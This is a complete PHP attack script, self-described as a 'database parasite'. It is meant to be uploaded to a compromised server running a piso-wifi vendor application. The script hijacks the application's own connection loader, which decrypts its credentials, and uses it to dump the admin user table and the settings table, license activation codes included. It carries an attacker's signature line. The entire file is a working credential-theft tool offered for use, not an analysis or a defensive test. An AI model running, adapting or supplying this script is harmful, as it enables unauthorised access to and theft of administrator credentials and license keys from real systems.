<?php
// DATABASE PARASITE SCRIPT
// Usage: Upload to target and run with 'php db_parasite.php'
// Goal: Hijack the existing application connection to dump credentials.

// 1. Include the application's connection loader.
// This executes Lpbpisowifi\lpb::conn(), which decrypts the creds 
// and establishes the global variable $link.
require_once('/etc/bluetooth/bluetooth/vendor/mtdowling/cron-expression/src/Cron/conn.php');

echo "[!] By: Colton Silva (chinawaterstealers).\n";

if (!$link) {
    die("[-] Parasite Failed: Connection link not established.\n");
}

echo "[+] Parasite Attached. DB Connection Active.\n";

// 2. Dump the Admin Credentials
echo "\n--- DUMPING ADMIN CREDENTIALS ---\n";
$query = "SELECT * FROM my_users";
$result = mysqli_query($link, $query);

if ($result) {
    while ($row = mysqli_fetch_assoc($result)) {
        print_r($row);
    }
} else {
    echo "[-] Query Failed: " . mysqli_error($link) . "\n";
}

// 3. Dump Settings (Optional)
echo "\n--- DUMPING SETTINGS ---\n";
$query = "SELECT * FROM my_settings";
$result = mysqli_query($link, $query);

if ($result) {
    while ($row = mysqli_fetch_assoc($result)) {
        // Obscure license key for log safety if needed
        // $row['activationcode'] = 'REDACTED'; 
        print_r($row);
    }
}

echo "\n[+] Extraction Complete.\n";
?>
